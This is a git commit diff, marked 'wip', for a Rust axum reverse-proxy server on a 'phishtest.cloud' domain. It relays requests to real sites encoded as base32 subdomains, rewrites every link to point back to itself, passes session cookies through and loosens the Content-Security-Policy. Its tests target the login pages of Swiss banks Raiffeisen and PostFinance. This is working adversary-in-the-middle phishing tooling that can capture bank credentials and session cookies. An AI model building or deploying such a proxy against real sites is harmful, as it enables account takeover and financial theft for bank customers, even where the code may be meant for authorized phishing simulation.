90b916ca1ab4c389ad3dc0045769090d84a9e6ba
schaelle <schaelle@gmail.com>
2025-05-21 23:57:19 +0200

    wip

--- src/main.rs
+++ src/main.rs
@@ -1,24 +1,37 @@
 use axum::Router;
-use axum::extract::Path;
+use axum::extract::{Path, Query, RawQuery};
 use axum::http::{HeaderMap, Method, StatusCode};
 use axum::response::IntoResponse;
 use axum::routing::{delete, get, post, put};
+use base32::decode;
 use base64::Engine;
 use base64::engine::general_purpose::STANDARD_NO_PAD;
 use bytes::Bytes;
+use cookie::CookieBuilder;
+use lazy_static::lazy_static;
 use regex::{Captures, Regex, Replacer};
-use reqwest::ClientBuilder;
+use reqwest::cookie::Cookie;
 use reqwest::redirect::Policy;
+use reqwest::{Body, ClientBuilder, Url};
 use std::collections::HashMap;
+use std::fmt::format;
 use std::string::ToString;
 
-async fn get_root(path: Option<Path<String>>, method: Method, mut request_header: HeaderMap) -> impl IntoResponse {
+async fn get_root(
+    path: Option<Path<String>>,
+    method: Method,
+    RawQuery(params): RawQuery,
+    mut request_header: HeaderMap,
+    body: Bytes,
+) -> impl IntoResponse {
     let domain = "local-dev.phishtest.cloud:53001";
+
+    // println!("Body: {}", body.len());
 
     let mut headers = HeaderMap::new();
     headers.insert(
         "Content-Security-Policy",
-        format!("default-src 'self' http://*.{domain}/; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline'")
+        format!("default-src 'self' http://*.{domain}/ data:; style-src 'self' http://*.{domain}/ 'unsafe-inline'; script-src 'self' http://*.{domain}/ 'unsafe-inline' 'unsafe-eval'")
             .parse()
             .unwrap(),
     );
@@ -49,52 +62,98 @@ async fn get_root(path: Option<Path<String>>, method: Method, mut request_header
     request_header.remove("origin");
     request_header.remove("referer");
     request_header.remove("accept-encoding");
-    println!("Headers: {:?}", request_header);
+    request_header.remove("content-length");
+    // println!("Headers: {:?}", request_header);
+
+    let mut url = Url::parse(&format!("https://{subdomain}/{path}")).unwrap();
+    if let Some(query) = params {
+        url.set_query(Some(query.as_str()));
+    }
+
+    println!("Url: {}", url);
 
     let client = ClientBuilder::new()
         .redirect(Policy::none())
         .build()
         .unwrap();
     let res = client
-        .request(method,format!("https://{subdomain}/{path}"))
+        .request(method, url)
         .headers(request_header)
+        .body(Body::from(body)) //TODO inspect
         .send()
         .await
         .unwrap();
 
-    println!("Url: {}", res.url());
+    for cookie in res.cookies() {
+        let mut builder = CookieBuilder::new(cookie.name(), cookie.value());
+        if let Some(path) = cookie.path() {
+            builder = builder.path(path);
+        }
+        headers.append("Set-Cookie", builder.build().to_string().parse().unwrap());
+    }
+
+    println!("Response: {:?}", res);
 
     let status_code = res.status();
-    match(status_code){
-        StatusCode::MOVED_PERMANENTLY => {
-            let location = res.headers().get("location").unwrap().to_str().unwrap();
-            let target = translate_domains(location.to_string(), domain, true);
-            headers.insert("Location", target.parse().unwrap());
+    // println!("Status: {}", status_code);
+    // match (status_code) {
+    //     StatusCode::MOVED_PERMANENTLY => {
+    //         let location = res.headers().get("location").unwrap().to_str().unwrap();
+    //         let target = translate_domains(location.to_string(), domain, true);
+    //         headers.insert("Location", target.parse().unwrap());
+    //
+    //         return (StatusCode::MOVED_PERMANENTLY, headers, Bytes::new());
+    //     }
+    //     StatusCode::TEMPORARY_REDIRECT => {
+    //         let location = res.headers().get("location").unwrap().to_str().unwrap();
+    //         let target = translate_domains(location.to_string(), domain, true);
+    //         headers.insert("Location", target.parse().unwrap());
+    //
+    //         return (StatusCode::TEMPORARY_REDIRECT, headers, Bytes::new());
+    //     }
+    //     _ => {}
+    // }
 
-            return (StatusCode::MOVED_PERMANENTLY, headers, Bytes::new());
-        },
-        _=> {}
+    if let Some(location) = res.headers().get("location") {
+        let target = translate_domains(location.to_str().unwrap().to_string(), domain, true);
+        headers.insert("Location", target.parse().unwrap());
     }
+
     if let Some(content_type) = res.headers().get("Content-Type") {
         headers.insert("Content-Type", content_type.clone());
     }
-    // for cookie in res.cookies() {
-    //     println!("Cookie: {:?}", cookie);
-    // }
 
-    for cookie in res.headers().get_all("Set-Cookie"){
-        //TODO filter
-        let c = clean_cookie(cookie.to_str().unwrap());
-        println!("Cookie: {:?}", c);
-        headers.insert("Set-Cookie", c.parse().unwrap());
+    res.headers().iter().for_each(|(key, value)| {
+        if !headers.contains_key(key) && key != "location" {
+            // if let Ok(value) = value.to_str() {
+            //     headers.insert(
+            //         key.clone(),
+            //         translate_domains(value.to_string(), domain, true)
+            //             .parse()
+            //             .unwrap(),
+            //     );
+            // } else {
+            //     headers.insert(key.clone(), value.clone());
+            // }
+        }
+    });
+
+    let transfer_headers = vec!["post_flow_redirect"];
+    for header in transfer_headers {
+        if let Some(value) = res.headers().get(header) {
+            headers.insert(header, value.clone());
+        }
     }
+
+    headers.remove("transfer-encoding");
+    headers.remove("content-length");
+
+    println!("Headers: {:?}", headers);
+
     let mut content = res.bytes().await.unwrap();
 
     if let Ok(string_content) = String::from_utf8(content.to_vec()) {
-        // if !path.ends_with(".js") {
-        // println!("translate content: {path}");
         content = Bytes::from(translate_domains(string_content, domain, true));
-        // }
     }
 
     // builder.body(content).unwrap()
@@ -110,8 +169,7 @@ async fn main() {
         .route("/{*path}", get(get_root))
         .route("/{*path}", delete(get_root))
         .route("/{*path}", post(get_root))
-        .route("/{*path}", put(get_root))
-        ;
+        .route("/{*path}", put(get_root));
 
     let listener = tokio::net::TcpListener::bind("0.0.0.0:53001")
         .await
@@ -148,9 +206,21 @@ impl<'a> Replacer for NameSwapper<'a> {
     }
 }
 
-fn translate_domains(input: String, domain: &str, downgrade: bool) -> String {
-    let pattern = Regex::new(r"(?<scheme>\w+:)?//([\w.-]+)(/)?").unwrap();
+struct NameReverseSwapper {}
 
+impl Replacer for NameReverseSwapper {
+    fn replace_append(&mut self, caps: &Captures<'_>, dst: &mut String) {
+        let domain = &caps[1];
+        let domain = decode_domain(domain);
+        dst.push_str(&domain);
+    }
+}
+
+lazy_static!{
+    static ref pattern: Regex = Regex::new(r"(?<scheme>https?:)?//((?:[a-z0-9](?:[a-z0-9-]{0,61}[a-z0-9])?\.)+[a-z0-9][a-z0-9-]{0,61}[a-z0-9])(/)?").unwrap();
+}
+
+fn translate_domains(input: String, domain: &str, downgrade: bool) -> String {
     pattern
         .replace_all(
             input.as_str(),
@@ -162,23 +232,25 @@ fn translate_domains(input: String, domain: &str, downgrade: bool) -> String {
         .to_string()
 }
 
+fn reverse_translate_domains(input: String, domain: &str) -> String {
+    let p = Regex::new(&format!("(\\w+)\\.{}", domain)).unwrap();
+
+    p.replace_all(input.as_str(), NameReverseSwapper {})
+        .to_string()
+}
+
 fn encode_domain(domain: &str) -> String {
     let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
     base32::encode(alphabet, domain.as_bytes())
 }
-
-fn clean_cookie(cookie: &str) -> String {
-    let pattern = Regex::new(r"Domain=.*?;").unwrap();
-
-    pattern.replace_all(cookie, "");
-    let res = cookie.replace("Secure;", "");
-    let res = pattern.replace(&res, "").to_string();
-    res
+fn decode_domain(domain: &str) -> String {
+    let alphabet = base32::Alphabet::Rfc4648Lower { padding: false };
+    String::from_utf8(base32::decode(alphabet, domain).unwrap()).unwrap()
 }
 
 #[cfg(test)]
 mod tests {
-    use crate::{clean_cookie, encode_domain, translate_domains};
+    use crate::{decode_domain, encode_domain, reverse_translate_domains, translate_domains};
 
     #[test]
     fn test_encoding() {
@@ -187,17 +259,14 @@ mod tests {
         let input = encode_domain("www.raiffeisen.ch");
         assert_eq!("o53xoltsmfuwmztfnfzwk3romnua", input);
 
-        let data = base32::decode(alphabet, input.as_str()).unwrap();
-        assert_eq!("www.raiffeisen.ch", String::from_utf8(data).unwrap());
+        let data = decode_domain(input.as_str());
+        assert_eq!("www.raiffeisen.ch", data);
 
         let input = encode_domain("login.raiffeisen.ch");
         assert_eq!("nrxwo2lofzzgc2lgmzsws43fnyxgg2a", input);
-    }
-    
-    #[test]
-    fn test_cookie(){
-        let input = "lang=de; Path=/; Secure; Domain=.raiffeisen.ch; Expires=Thu, 20 May 2027 23:56:19 GMT; SameSite=Lax";
-        assert_eq!("lang=de; Path=/;   Expires=Thu, 20 May 2027 23:56:19 GMT; SameSite=Lax", clean_cookie(input));
+
+        let input = encode_domain("www.postfinance.ch");
+        assert_eq!("o53xoltqn5zxiztjnzqw4y3ffzrwq", input);
     }
 
     #[test]
@@ -255,5 +324,24 @@ mod tests {
         //     "amai?\"https://fast.\":\"https://\"),t=r+this.subdoma",
         //     output
         // );
+    }
+
+    #[test]
+    fn test_content_reverse_rewrite() {
+        let output = reverse_translate_domains(
+            "hreflang=\"it-CH\" href=\"https://nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local/it\"/>"
+                .to_string(),
+            "domain.local",
+        );
+        assert_eq!(
+            "hreflang=\"it-CH\" href=\"https://login.raiffeisen.ch/it\"/>",
+            output
+        );
+
+        let output = reverse_translate_domains(
+            "nrxwo2lofzzgc2lgmzsws43fnyxgg2a.domain.local".to_string(),
+            "domain.local",
+        );
+        assert_eq!("login.raiffeisen.ch", output);
     }
 }
